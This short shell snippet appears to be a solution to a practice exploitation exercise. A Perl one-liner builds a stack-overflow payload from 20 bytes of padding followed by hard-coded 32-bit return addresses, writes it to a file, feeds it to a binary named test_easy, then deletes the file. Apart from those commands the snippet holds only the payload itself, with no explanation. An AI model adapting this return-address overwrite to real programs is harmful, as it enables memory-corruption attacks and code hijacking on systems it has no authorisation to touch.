perl -e 'print "A"x20 . "\x80\x83\x04\x08" . "\x21\x86\x04\x08"x2' > payload
./test/test_easy payload
rm payload
